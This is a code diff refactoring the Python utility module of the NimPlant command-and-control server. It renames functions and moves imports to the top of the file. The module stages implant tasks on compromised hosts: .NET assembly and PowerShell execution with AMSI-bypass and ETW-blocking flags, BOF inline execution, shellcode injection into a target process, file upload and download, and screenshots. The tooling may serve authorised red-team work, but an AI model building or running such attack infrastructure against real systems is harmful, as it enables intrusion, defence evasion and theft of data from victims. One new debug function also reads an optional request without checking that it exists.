@@ -1,9 +1,27 @@
+import base64
+import binascii
+import hashlib
+import json
+import os
+import shlex
+import sys
+import traceback
+
 from datetime import datetime
 from struct import pack, calcsize
+from gzip import decompress
 from time import sleep
+from typing import Optional, IO
 from zlib import compress
-import base64
-import os, hashlib, json, sys
+
+from flask import Request
+
+import server.util.commands as commands
+from server.util.config import config
+from server.util.crypto import encrypt_data
+from server.util.db import db_nimplant_log, db_server_log
+from server.util.nimplant import np_server, NimPlant
+
 
 # Clear screen
 def cls():
@@ -14,102 +32,91 @@ def cls():
 
 
 # Timestamp function
-timestampFormat = "%d/%m/%Y %H:%M:%S"
-filenameSafeTimestampFormat = "%d-%m-%Y_%H-%M-%S"
+TIMESTAMP_FORMAT = "%d/%m/%Y %H:%M:%S"
+FILENAME_SAFE_TIMESTAMP_FORMAT = "%d-%m-%Y_%H-%M-%S"
 
 
 def timestamp(filename_safe=False):
     if filename_safe:
-        return datetime.now().strftime(filenameSafeTimestampFormat)
+        return datetime.now().strftime(FILENAME_SAFE_TIMESTAMP_FORMAT)
     else:
-        return datetime.now().strftime(timestampFormat)
+        return datetime.now().strftime(TIMESTAMP_FORMAT)
 
 
 # Loop to check for late checkins (can be infinite - runs as separate thread)
-def periodicNimplantChecks():
-    from .nimplant import np_server
-
+def periodic_nimplant_checks():
     while True:
-        np_server.checkLateNimplants()
+        np_server.check_late_nimplants()
         sleep(5)
 
 
 # Log input and output to flat files per session
 def log(message, target=None):
-    from .nimplant import np_server
+    np = np_server.get_nimplant_by_guid(target)
 
-    np = np_server.getNimplantByGuid(target)
-
-    logDir = os.path.abspath(
+    log_directory = os.path.abspath(
         os.path.join(
             os.path.dirname(sys.argv[0]), "server", "logs", f"server-{np_server.name}"
         )
     )
-    os.makedirs(logDir, exist_ok=True)
+    os.makedirs(log_directory, exist_ok=True)
 
     if target is not None and np is not None:
-        logFile = f"session-{np.id}-{np.guid}.log"
+        log_file = f"session-{np.id}-{np.guid}.log"
     else:
-        logFile = f"console.log"
+        log_file = "console.log"
 
-    logFilePath = os.path.join(logDir, logFile)
-    with open(logFilePath, "a") as f:
+    log_file_path = os.path.join(log_directory, log_file)
+    with open(log_file_path, "a", encoding="utf-8") as f:
         f.write(message + "\n")
 
 
 # Print function to properly direct output
-def nimplantPrint(message, target=None, task=None, taskGuid=None):
-    from .db import dbNimplantLog, dbServerLog
-    from .nimplant import np_server
-
-    np = np_server.getNimplantByGuid(target)
+def nimplant_print(message, target=None, task=None, task_guid=None):
+    np = np_server.get_nimplant_by_guid(target)
     if target is not None and np is not None:
         # Print to nimplant stream
         result = f"\x1b[1K\r[{timestamp()}|NP{np.id}] {message}"
 
         if task:
             # Log to database as server-side command (write command + result instantly)
-            dbNimplantLog(np, task=task, taskFriendly=task, result=message)
+            db_nimplant_log(np, task=task, task_friendly=task, result=message)
 
-        elif taskGuid:
+        elif task_guid:
             # Log to database as result of earlier task
-            dbNimplantLog(np, taskGuid=taskGuid, result=message)
+            db_nimplant_log(np, task_guid=task_guid, result=message)
 
         else:
             # Log to database as message without task
-            dbNimplantLog(np, result=message)
+            db_nimplant_log(np, result=message)
 
     else:
         # Print to console stream
         result = f"\x1b[1K\r[{timestamp()}] {message}"
-        dbServerLog(np_server, message)
+        db_server_log(np_server, message)
 
     log(f"[{timestamp()}] {message}", target)
     print(result)
 
 
 # Cleanly exit server
-def exitServer():
-    from .nimplant import np_server
-
-    if np_server.containsActiveNimplants():
-        np_server.killAllNimplants()
-        nimplantPrint(
+def exit_server():
+    if np_server.has_active_nimplants():
+        np_server.kill_all_nimplants()
+        nimplant_print(
             "Waiting for all NimPlants to receive kill command... Do not force quit!"
         )
-        while np_server.containsActiveNimplants():
+        while np_server.has_active_nimplants():
             sleep(1)
 
-    nimplantPrint("Exiting...")
+    nimplant_print("Exiting...")
     np_server.kill()
     os._exit(0)
 
 
 # Exit wrapper for console use
-def exitServerConsole():
-    from .nimplant import np_server
-
-    if np_server.containsActiveNimplants():
+def exit_server_console():
+    if np_server.has_active_nimplants():
         check = (
             str(
                 input(
@@ -120,35 +127,31 @@ def exitServerConsole():
             .strip()
         )
         if check[0] == "y":
-            exitServer()
+            exit_server()
     else:
-        exitServer()
+        exit_server()
 
 
 # Pretty print function
-def prettyPrint(d):
+def pretty_print(d):
     return json.dumps(d, sort_keys=True, indent=2, default=str)
 
 
 # Help menu function
-def getHelpMenu():
-    from .commands import getCommands
-
+def get_help_menu():
     res = "NIMPLANT HELP\n"
     res += (
         "Command arguments shown as [required] <optional>.\n"
         "Commands with (GUI) can be run without parameters via the web UI.\n\n"
     )
-    for c in getCommands():
+    for c in commands.get_commands():
         res += f"{c['command']:<18}{c['description']:<75}\n"
     return res.rstrip()
 
 
 # Print the help text for a specific command
-def getCommandHelp(command):
-    from .commands import getCommands
-
-    c = [c for c in getCommands() if c["command"] == command]
+def get_command_help(command):
+    c = [c for c in commands.get_commands() if c["command"] == command]
 
     if not c:
         return "Help: Command not found."
@@ -163,23 +166,18 @@ def getCommandHelp(command):
 
 
 # Get the server configuration as a YAML object
-def getConfigJson():
-    from .nimplant import np_server
-    from .config import config
-
+def get_config_json():
     res = {"GUID": np_server.guid, "Server Configuration": config}
     return json.dumps(res)
 
 
 # Handle pre-processing for the 'execute-assembly' command
-def executeAssembly(np, args, raw_command):
-    from .crypto import encryptData
-
+def execute_assembly(np: NimPlant, args, raw_command):
     # TODO: Make AMSI/ETW arg parsing more user-friendly
     amsi = "1"
     etw = "1"
 
-    k = 1
+    k = 0
     for i in range(len(args)):
         if args[i].startswith("BYPASSAMSI"):
             amsi = args[i].split("=")[-1]
@@ -190,21 +188,24 @@ def executeAssembly(np, args, raw_command):
 
     try:
         file = args[k]
-    except:
-        nimplantPrint(
+    except IndexError:
+        nimplant_print(
             "Invalid number of arguments received. Usage: 'execute-assembly <BYPASSAMSI=0> <BLOCKETW=0> [localfilepath] <arguments>'.",
             np.guid,
             raw_command,
         )
         return
 
-    # Check if assembly is provided as file path (normal use) or Base64 blob (GUI)
+    # Check if assembly is provided as file path (normal use), GUI use is handled via API
+    assembly = None
     try:
         if os.path.isfile(file):
             with open(file, "rb") as f:
                 assembly = f.read()
+        else:
+            raise FileNotFoundError
     except:
-        nimplantPrint(
+        nimplant_print(
             "Invalid assembly file specified.",
             np.guid,
             raw_command,
@@ -212,16 +213,17 @@ def executeAssembly(np, args, raw_command):
         return
 
     assembly = compress(assembly, level=9)
-    assembly = encryptData(assembly, np.cryptKey)
-    assemblyArgs = " ".join(args[k + 1 :])
+    assembly = encrypt_data(assembly, np.encryption_key)
+    assembly_arguments = " ".join(args[k + 1 :])
 
-    commandArgs = " ".join([amsi, etw, assembly, assemblyArgs])
+    command = " ".join(
+        shlex.quote(arg)
+        for arg in ["execute-assembly", amsi, etw, assembly, assembly_arguments]
+    )
 
-    command = f"execute-assembly {commandArgs}"
-
-    guid = np.addTask(command, taskFriendly=raw_command)
-    nimplantPrint(
-        "Staged execute-assembly command for NimPlant.", np.guid, taskGuid=guid
+    guid = np.add_task(command, task_friendly=raw_command)
+    nimplant_print(
+        "Staged execute-assembly command for NimPlant.", np.guid, task_guid=guid
     )
 
 
@@ -271,16 +273,13 @@ class BeaconPack:
 
 
 # Handle pre-processing for the 'inline-execute' command
-def inlineExecute(np, args, raw_command):
-    from .crypto import encryptData
-    import binascii
-
+def inline_execute(np: NimPlant, args, raw_command):
     try:
-        file = args[1]
-        entryPoint = args[2]
-        assemblyArgs = list(args[3:])
+        file = args[0]
+        entry_point = args[1]
+        assembly_arguments = list(args[2:])
     except:
-        nimplantPrint(
+        nimplant_print(
             "Invalid number of arguments received.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.",
             np.guid,
             raw_command,
@@ -292,7 +291,7 @@ def inlineExecute(np, args, raw_command):
         with open(file, "rb") as f:
             assembly = f.read()
     else:
-        nimplantPrint(
+        nimplant_print(
             "Invalid BOF file specified.",
             np.guid,
             raw_command,
@@ -300,26 +299,20 @@ def inlineExecute(np, args, raw_command):
         return
 
     assembly = compress(assembly, level=9)
-    assembly = encryptData(assembly, np.cryptKey)
+    assembly = encrypt_data(assembly, np.encryption_key)
 
     # Pre-process BOF arguments
     # Check if list of arguments consists of argument-type pairs
-    binaryArgTypes = ["binary", "bin", "b"]
-    integerArgTypes = ["integer", "int", "i"]
-    shortArgTypes = ["short", "s"]
-    stringArgTypes = ["string", "z"]
-    wstringArgTypes = ["wstring", "Z"]
-    allArgTypes = (
-        binaryArgTypes
-        + integerArgTypes
-        + shortArgTypes
-        + stringArgTypes
-        + wstringArgTypes
-    )
+    args_binary = ["binary", "bin", "b"]
+    args_integer = ["integer", "int", "i"]
+    args_short = ["short", "s"]
+    args_string = ["string", "z"]
+    args_wstring = ["wstring", "Z"]
+    args_all = args_binary + args_integer + args_short + args_string + args_wstring
 
-    if len(assemblyArgs) != 0:
-        if not len(assemblyArgs) % 2 == 0:
-            nimplantPrint(
+    if len(assembly_arguments) != 0:
+        if not len(assembly_arguments) % 2 == 0:
+            nimplant_print(
                 "BOF arguments not provided as arg-type pairs.\n"
                 "Usage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                 "Example: 'inline-execute dir.x64.o go C:\\Users\\Testuser\\Desktop wstring'",
@@ -330,33 +323,33 @@ def inlineExecute(np, args, raw_command):
 
         # Pack every argument-type pair
         buffer = BeaconPack()
-        argPairList = zip(assemblyArgs[::2], assemblyArgs[1::2])
-        for argPair in argPairList:
-            arg = argPair[0]
-            argType = argPair[1]
+        arg_pair_list = zip(assembly_arguments[::2], assembly_arguments[1::2])
+        for arg_pair in arg_pair_list:
+            arg = arg_pair[0]
+            argument_type = arg_pair[1]
 
             try:
-                if argType in binaryArgTypes:
+                if argument_type in args_binary:
                     buffer.addbin(arg)
-                elif argType in integerArgTypes:
+                elif argument_type in args_integer:
                     buffer.addint(int(arg))
-                elif argType in shortArgTypes:
+                elif argument_type in args_short:
                     buffer.addshort(int(arg))
-                elif argType in stringArgTypes:
+                elif argument_type in args_string:
                     buffer.addstr(arg)
-                elif argType in wstringArgTypes:
+                elif argument_type in args_wstring:
                     buffer.addWstr(arg)
                 else:
-                    nimplantPrint(
+                    nimplant_print(
                         "Invalid argument type provided.\n"
-                        f"Valid argument types (case-sensitive): {', '.join(allArgTypes)}.",
+                        f"Valid argument types (case-sensitive): {', '.join(args_all)}.",
                         np.guid,
                         raw_command,
                     )
                     return
 
             except ValueError:
-                nimplantPrint(
+                nimplant_print(
                     "Invalid integer or short value provided.\nUsage: 'inline-execute [localfilepath] [entrypoint] <arg1 type1 arg2 type2..>'.\n"
                     "Example: 'inline-execute createremotethread.x64.o go 1337 i [b64shellcode] b'",
                     np.guid,
@@ -364,22 +357,27 @@ def inlineExecute(np, args, raw_command):
                 )
                 return
 
-        assemblyArgs_final = str(binascii.hexlify(buffer.getbuffer()), "utf-8")
+        assembly_args_final = str(binascii.hexlify(buffer.getbuffer()), "utf-8")
     else:
-        assemblyArgs_final = ""
+        assembly_args_final = ""
 
-    commandArgs = " ".join([assembly, entryPoint, assemblyArgs_final])
-    command = f"inline-execute {commandArgs}"
-    guid = np.addTask(command, taskFriendly=raw_command)
-    nimplantPrint("Staged inline-execute command for NimPlant.", np.guid, taskGuid=guid)
+    command = " ".join(
+        shlex.quote(arg)
+        for arg in ["inline-execute", assembly, entry_point, assembly_args_final]
+    )
+
+    guid = np.add_task(command, task_friendly=raw_command)
+    nimplant_print(
+        "Staged inline-execute command for NimPlant.", np.guid, task_guid=guid
+    )
 
 
 # Handle pre-processing for the 'powershell' command
-def powershell(np, args, raw_command):
+def powershell(np: NimPlant, args, raw_command):
     amsi = "1"
     etw = "1"
 
-    k = 1
+    k = 0
     for i in range(len(args)):
         if args[i].startswith("BYPASSAMSI"):
             amsi = args[i].split("=")[-1]
@@ -388,54 +386,52 @@ def powershell(np, args, raw_command):
             etw = args[i].split("=")[-1]
             k += 1
 
-    powershellCmd = " ".join(args[k:])
+    powershell_cmd = " ".join(args[k:])
 
-    if powershellCmd == "":
-        nimplantPrint(
+    if powershell_cmd == "":
+        nimplant_print(
             "Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.",
             np.guid,
             raw_command,
         )
         return
 
-    commandArgs = " ".join([amsi, etw, powershellCmd])
+    command = " ".join(
+        shlex.quote(arg) for arg in ["powershell", amsi, etw, powershell_cmd]
+    )
 
-    command = f"powershell {commandArgs}"
-
-    guid = np.addTask(command, taskFriendly=raw_command)
-    nimplantPrint("Staged powershell command for NimPlant.", np.guid, taskGuid=guid)
+    guid = np.add_task(command, task_friendly=raw_command)
+    nimplant_print("Staged powershell command for NimPlant.", np.guid, task_guid=guid)
 
 
 # Handle pre-processing for the 'shinject' command
-def shinject(np, args, raw_command):
-    from .crypto import encryptData
-
+def shinject(np: NimPlant, args, raw_command):
     try:
-        processId, filePath = args[1:3]
+        process_id, file_path = args[0:2]
     except:
-        nimplantPrint(
+        nimplant_print(
             "Invalid number of arguments received. Usage: 'shinject [PID] [localfilepath]'.",
             np.guid,
             raw_command,
         )
         return
 
-    if os.path.isfile(filePath):
-        with open(filePath, "rb") as f:
+    if os.path.isfile(file_path):
+        with open(file_path, "rb") as f:
             shellcode = f.read()
 
         shellcode = compress(shellcode, level=9)
-        shellcode = encryptData(shellcode, np.cryptKey)
+        shellcode = encrypt_data(shellcode, np.encryption_key)
 
-        commandArgs = " ".join([processId, shellcode])
+        command = " ".join(
+            shlex.quote(arg) for arg in ["shinject", process_id, shellcode]
+        )
 
-        command = f"shinject {commandArgs}"
-
-        guid = np.addTask(command, taskFriendly=raw_command)
-        nimplantPrint("Staged shinject command for NimPlant.", np.guid, taskGuid=guid)
+        guid = np.add_task(command, task_friendly=raw_command)
+        nimplant_print("Staged shinject command for NimPlant.", np.guid, task_guid=guid)
 
     else:
-        nimplantPrint(
+        nimplant_print(
             "Shellcode file to inject does not exist.",
             np.guid,
             raw_command,
@@ -443,70 +439,67 @@ def shinject(np, args, raw_command):
 
 
 # Handle pre-processing for the 'upload' command
-def uploadFile(np, args, raw_command):
-    if len(args) == 2:
-        filePath = args[1]
-        remotePath = ""
-    elif len(args) == 3:
-        filePath = args[1]
-        remotePath = args[2]
+def upload_file(np: NimPlant, args, raw_command):
+    if len(args) == 1:
+        file_path = args[0]
+        remote_path = ""
+    elif len(args) == 2:
+        file_path = args[0]
+        remote_path = args[1]
     else:
-        nimplantPrint(
+        nimplant_print(
             "Invalid number of arguments received. Usage: 'upload [local file] <optional: remote destination path>'.",
             np.guid,
             raw_command,
         )
         return
 
-    fileName = os.path.basename(filePath)
-    fileId = hashlib.md5(filePath.encode("UTF-8")).hexdigest()
+    file_name = os.path.basename(file_path)
+    file_id = hashlib.md5(file_path.encode("UTF-8")).hexdigest()
 
-    if os.path.isfile(filePath):
-        np.hostFile(filePath)
-        command = f"upload {fileId} {fileName} {remotePath}"
+    if os.path.isfile(file_path):
+        np.host_file(file_path)
+        command = " ".join(
+            shlex.quote(arg) for arg in ["upload", file_id, file_name, remote_path]
+        )
 
-        guid = np.addTask(command, taskFriendly=raw_command)
-        nimplantPrint("Staged upload command for NimPlant.", np.guid, taskGuid=guid)
+        guid = np.add_task(command, task_friendly=raw_command)
+        nimplant_print("Staged upload command for NimPlant.", np.guid, task_guid=guid)
 
     else:
-        nimplantPrint("File to upload does not exist.", np.guid, raw_command)
+        nimplant_print("File to upload does not exist.", np.guid, raw_command)
 
 
 # Handle pre-processing for the 'download' command
-def downloadFile(np, args, raw_command):
-    from .nimplant import np_server
-
-    if len(args) == 2:
-        filePath = args[1]
-        fileName = filePath.replace("/", "\\").split("\\")[-1]
-        localPath = (
-            f"server/downloads/server-{np_server.guid}/nimplant-{np.guid}/{fileName}"
+def download_file(np: NimPlant, args, raw_command):
+    if len(args) == 1:
+        file_path = args[0]
+        file_name = file_path.replace("/", "\\").split("\\")[-1]
+        local_path = (
+            f"server/downloads/server-{np_server.guid}/nimplant-{np.guid}/{file_name}"
         )
-    elif len(args) == 3:
-        filePath = args[1]
-        localPath = args[2]
+    elif len(args) == 2:
+        file_path = args[0]
+        local_path = args[1]
     else:
-        nimplantPrint(
+        nimplant_print(
             "Invalid number of arguments received. Usage: 'download [remote file] <optional: local destination path>'.",
             np.guid,
             raw_command,
         )
         return
 
-    os.makedirs(os.path.dirname(localPath), exist_ok=True)
-    np.receiveFile(localPath)
-    command = f"download {filePath}"
+    os.makedirs(os.path.dirname(local_path), exist_ok=True)
+    np.receive_file(local_path)
+    command = " ".join(shlex.quote(arg) for arg in ["download", file_path])
 
-    guid = np.addTask(command, taskFriendly=raw_command)
-    nimplantPrint("Staged download command for NimPlant.", np.guid, taskGuid=guid)
+    guid = np.add_task(command, task_friendly=raw_command)
+    nimplant_print("Staged download command for NimPlant.", np.guid, task_guid=guid)
 
 
 # Handle post-processing of the 'screenshot' command
 # This function is called based on the blob header b64(gzip(screenshot)), so we don't need to verify the format
-def processScreenshot(np, sc_blob) -> str:
-    from .nimplant import np_server
-    from gzip import decompress
-
+def process_screenshot(np: NimPlant, sc_blob) -> str:
     sc_blob = decompress(base64.b64decode(sc_blob))
 
     path = f"server/downloads/server-{np_server.guid}/nimplant-{np.guid}/screenshot_{timestamp(filename_safe=True)}.png"
@@ -519,52 +512,98 @@ def processScreenshot(np, sc_blob) -> str:
 
 # Get last lines of file
 # Credit 'S.Lott' on StackOverflow: https://stackoverflow.com/questions/136168/get-last-n-lines-of-a-file-similar-to-tail
-def tail(f, lines):
+def tail(f: IO[bytes], lines):
+    block_size = 1024
     total_lines_wanted = lines
-    BLOCK_SIZE = 1024
     f.seek(0, 2)
     block_end_byte = f.tell()
     lines_to_go = total_lines_wanted
     block_number = -1
     blocks = []
     while lines_to_go > 0 and block_end_byte > 0:
-        if block_end_byte - BLOCK_SIZE > 0:
-            f.seek(block_number * BLOCK_SIZE, 2)
-            blocks.append(f.read(BLOCK_SIZE))
+        if block_end_byte - block_size > 0:
+            f.seek(block_number * block_size, 2)
+            blocks.append(f.read(block_size))
         else:
             f.seek(0, 0)
             blocks.append(f.read(block_end_byte))
         lines_found = blocks[-1].count(b"\n")
         lines_to_go -= lines_found
-        block_end_byte -= BLOCK_SIZE
+        block_end_byte -= block_size
         block_number -= 1
     all_read_text = b"".join(reversed(blocks))
     return b"\n".join(all_read_text.splitlines()[-total_lines_wanted:])
 
 
-def tailNimPlantLog(np=None, lines=100):
-    from .nimplant import np_server
-
-    logDir = os.path.abspath(
+def tail_nimplant_log(np: NimPlant = None, lines=100):
+    log_directory = os.path.abspath(
         os.path.join(
             os.path.dirname(sys.argv[0]), "server", "logs", f"server-{np_server.name}"
         )
     )
 
     if np:
-        logFile = f"session-{np.id}-{np.guid}.log"
-        id = np.guid
+        log_file = f"session-{np.id}-{np.guid}.log"
+        nimplant_id = np.guid
     else:
-        logFile = f"console.log"
-        id = "CONSOLE"
+        log_file = "console.log"
+        nimplant_id = "CONSOLE"
 
-    logFilePath = os.path.join(logDir, logFile)
+    log_file_path = os.path.join(log_directory, log_file)
 
-    if os.path.exists(logFilePath):
-        with open(logFilePath, "rb") as f:
-            logContents = tail(f, lines).decode("utf8")
+    if os.path.exists(log_file_path):
+        with open(log_file_path, "rb") as f:
+            log_contents = tail(f, lines).decode("utf8")
     else:
         lines = 0
-        logContents = ""
+        log_contents = ""
 
-    return {"id": id, "lines": lines, "result": logContents}
+    return {"id": nimplant_id, "lines": lines, "result": log_contents}
+
+
+# Define a utility function to easily get the 'real' IP from a request
+def get_external_ip(request: Request):
+    if request.headers.get("X-Forwarded-For"):
+        return request.access_route[0]
+    else:
+        return request.remote_addr
+
+
+def dump_debug_info_for_exception(
+    error: Exception, request: Optional[Request] = None
+) -> None:
+    # Capture the full traceback as a string
+    traceback_str = "".join(
+        traceback.format_exception(type(error), error, error.__traceback__)
+    )
+
+    # Log detailed error information
+    nimplant_print("Detailed traceback:")
+    nimplant_print(traceback_str)
+
+    # Additional request context
+    request_headers = dict(request.headers)
+    request_method = request.method
+    request_path = request.path
+    request_query_string = request.query_string.decode("utf-8")
+    request_remote_addr = request.remote_addr
+    try:
+        request_body_snippet = request.get_data(as_text=True)[
+            :200
+        ]  # Log only the first 200 characters
+    except Exception as e:
+        request_body_snippet = "Error reading request body: " + str(e)
+
+    # Environment details
+    environment_details = {
+        "REQUEST_METHOD": request_method,
+        "PATH_INFO": request_path,
+        "QUERY_STRING": request_query_string,
+        "REMOTE_ADDR": request_remote_addr,
+        "REQUEST_HEADERS": request_headers,
+        "REQUEST_BODY_SNIPPET": request_body_snippet,
+    }
+
+    # Log additional context
+    nimplant_print("Request Details:")
+    nimplant_print(json.dumps(environment_details, indent=4, ensure_ascii=False))
